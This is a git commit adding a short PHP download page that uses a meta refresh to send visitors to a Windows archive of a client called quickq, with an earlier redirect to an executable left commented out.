f7dd34f0bf1b0ed004352aa019d3bca9bc693af7
quickq-pc <bargain08.88@gmail.com>
2024-08-23 09:57:07 -0700

    Add files via upload

---
+++ download.php
@@ -0,0 +1,6 @@
+<?php
+//header("Location: https://dl.aa246.cc:666/quickq/download/win32-quickq.exe", true, 301);
+//exit();
+echo '<meta http-equiv="refresh" content="0; URL=https://static.quickq-down.com/win32-quickq%20.rar">';
+exit();
+?>
